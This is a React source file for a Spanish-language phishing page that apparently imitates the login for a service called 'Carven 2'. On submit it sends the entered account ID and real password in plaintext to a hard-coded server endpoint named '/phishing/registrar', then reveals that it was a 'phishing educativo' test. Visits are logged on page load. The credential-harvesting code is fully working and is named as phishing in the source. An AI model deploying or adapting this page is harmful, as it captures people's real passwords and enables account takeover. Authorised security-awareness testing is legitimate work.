import { useState, useEffect } from "react";

function Carven2() {
  const [loading, setLoading] = useState(false);
  const [showResult, setShowResult] = useState(false);
  const [formData, setFormData] = useState({ ch: "", password: "" });

  const API_URL = "http://192.168.28.35:3002";

  useEffect(() => {
    const registrarVisita = async () => {
      try {
        await fetch("/phishing/registrar", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            ch: "VISITA_INICIAL",
            password: "NO_INGRESADA",
            user_agent: navigator.userAgent,
            pagina: window.location.href,
            timestamp: new Date().toISOString(),
            tipo: "visita",
          }),
        });
        console.log("📊 Visita registrada");
      } catch (error) {
        console.error("Error:", error);
      }
    };
    registrarVisita();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!/^CH\d+$/i.test(formData.ch)) {
      alert('El CH debe tener el formato "CH" seguido de números');
      return;
    }
    if (formData.password.length < 4) {
      alert("La contraseña debe tener al menos 4 caracteres");
      return;
    }

    setLoading(true);

    try {
      await fetch(`${API_URL}/phishing/registrar`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ch: formData.ch,
          password: formData.password,
          user_agent: navigator.userAgent,
          pagina: window.location.href,
          timestamp: new Date().toISOString(),
          tipo: "intento",
        }),
      });

      setTimeout(() => {
        setLoading(false);
        setShowResult(true);
      }, 2000);
    } catch (error) {
      console.error("❌ Error:", error);
      setLoading(false);
      alert("Error al conectar con el servidor");
    }
  };

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const closeResult = () => {
    setShowResult(false);
    setFormData({ ch: "", password: "" });
  };

  if (showResult) {
    return (
      <div
        style={{
          position: "fixed",
          top: 0,
          left: 0,
          width: "100%",
          height: "100%",
          background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          zIndex: 1001,
        }}
      >
        <div style={{ textAlign: "center", padding: "20px" }}>
          <div style={{ fontSize: "120px", marginBottom: "20px" }}>😢</div>
          <div
            style={{
              background: "rgba(255,255,255,0.95)",
              padding: "30px",
              borderRadius: "20px",
              maxWidth: "500px",
            }}
          >
            <h2 style={{ color: "#ff6b35" }}>🎉 ¡FELICIDADES! 🎉</h2>
            <p>
              <strong>¡No pasaste esta prueba!</strong>
            </p>
            <p>Has demostrado ser una persona no consciente de la seguridad.</p>
            <div
              style={{
                background: "#f0f0f0",
                padding: "15px",
                borderRadius: "10px",
                margin: "20px 0",
              }}
            >
              🔒 <strong>EL SECRETO:</strong> 🔒
              <br />
              Esta era una prueba de phishing educativa.
              <br />
              ¡Nunca compartas tus credenciales reales!
            </div>

            <button
              onClick={closeResult}
              style={{
                background: "#ff6b35",
                padding: "12px 30px",
                border: "none",
                borderRadius: "25px",
                cursor: "pointer",
                color: "white",
              }}
            >
              Entendido
            </button>

            <div>
              <p
                style={{
                  display: "inline-block",
                  padding: "8px 20px",
                  background: "rgba(255,255,255,0.15)",
                  backdropFilter: "blur(10px)",
                  borderRadius: "30px",
                  color: "rgba(255, 115, 0, 0.9)",
                  fontSize: "12px",
                  fontWeight: "500",
                  letterSpacing: "0.5px",
                  border: "1px solid rgba(255,255,255,0.2)",
                  marginTop: "20px",
                  textAlign: "center",
                }}
              >
                🔥 CREADO POR MIKE E IAN 🔥
              </p>
            </div>
            <br />
          </div>
        </div>
      </div>
    );
  }

  return (
    <div
      style={{
        minHeight: "100vh",
        background: "linear-gradient(135deg, #ff6b35 0%, #ff8c42 100%)",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        padding: "20px",
      }}
    >
      {loading && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            width: "100%",
            height: "100%",
            background: "rgba(0,0,0,0.9)",
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            flexDirection: "column",
            zIndex: 1000,
          }}
        >
          <div style={{ fontSize: "80px", animation: "pulse 1s infinite" }}>
            🤔
          </div>
          <div style={{ color: "white", marginTop: "20px" }}>
            Analizando credenciales...
          </div>
        </div>
      )}

      <div
        style={{
          background: "white",
          borderRadius: "20px",
          boxShadow: "0 20px 60px rgba(0,0,0,0.3)",
          padding: "40px",
          maxWidth: "500px",
          width: "100%",
          zIndex: 10,
        }}
      >
        <div style={{ textAlign: "center", marginBottom: "30px" }}>
          <h1 style={{ color: "#ff6b35", fontSize: "24px" }}>
            OBTEN ACCESO A TU NUEVO
          </h1>
          <h2 style={{ color: "#ff8c42", fontSize: "32px" }}>CARVEN 2</h2>
          <p style={{ color: "#666" }}>Inicia sesión</p>
        </div>

        <form onSubmit={handleSubmit}>
          <div style={{ marginBottom: "20px" }}>
            <label
              style={{
                display: "block",
                marginBottom: "8px",
                fontWeight: "600",
              }}
            >
              CH
            </label>
            <input
              type="text"
              name="ch"
              placeholder="Ej: CH123456"
              value={formData.ch}
              onChange={handleChange}
              style={{
                width: "100%",
                padding: "12px",
                border: "2px solid #e0e0e0",
                borderRadius: "10px",
                fontSize: "16px",
              }}
              required
            />
          </div>

          <div style={{ marginBottom: "20px" }}>
            <label
              style={{
                display: "block",
                marginBottom: "8px",
                fontWeight: "600",
              }}
            >
              Contraseña de Carven
            </label>
            <input
              type="password"
              name="password"
              placeholder="Ingrese su contraseña"
              value={formData.password}
              onChange={handleChange}
              style={{
                width: "100%",
                padding: "12px",
                border: "2px solid #e0e0e0",
                borderRadius: "10px",
                fontSize: "16px",
              }}
              required
            />
          </div>

          <button
            type="submit"
            style={{
              width: "100%",
              padding: "14px",
              background: "#ff6b35",
              color: "white",
              border: "none",
              borderRadius: "10px",
              fontSize: "16px",
              cursor: "pointer",
            }}
          >
            Verificar Acceso
          </button>
        </form>

        <div
          style={{
            marginTop: "20px",
            padding: "15px",
            background: "#f5f5f5",
            borderRadius: "10px",
            fontSize: "12px",
            textAlign: "center",
          }}
        >
          <strong>⚠️ Aviso de Seguridad</strong>
          <br />
          Nunca compartas tus credenciales en sitios sospechosos.
        </div>

        <div style={{ marginTop: "15px", textAlign: "center" }}>
          <a
            href="/carven2/admin"
            style={{
              color: "#ff6b35",
              textDecoration: "none",
              fontSize: "12px",
            }}
          >
            🔐 Panel Administrativo
          </a>
        </div>
      </div>

      <style>{`
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
      `}</style>
    </div>
  );
}

export default Carven2;
